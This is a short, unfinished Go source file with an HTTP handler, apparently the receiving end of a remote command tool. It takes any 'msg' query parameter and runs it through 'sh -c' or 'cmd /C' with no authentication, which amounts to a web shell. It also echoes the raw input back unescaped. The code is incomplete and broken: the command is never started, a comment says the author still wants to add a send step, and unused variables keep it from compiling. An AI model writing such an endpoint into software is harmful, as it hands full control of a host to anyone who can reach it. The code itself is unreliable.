package receiver

import (
	"fmt"
	"io"
	//"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
)

func Receive(w http.ResponseWriter, r *http.Request) {
	var outputPipe io.ReadCloser
	var cmdRunning bool

	msg := r.URL.Query().Get("msg")
	fmt.Fprintf(w, "Received msg: %s\n", msg)
	msg = strings.TrimSpace(msg)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", msg)
	} else {
		cmd = exec.Command("sh", "-c", msg)
	}

	output, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("command failed because of error: %v", err)
		http.Error(w, "Command failed because of error: "+err.Error(), http.StatusInternalServerError)
		return
	}

	outputPipe = output
	cmdRunning = true

	// i want to call send( ) here to splice and send
}
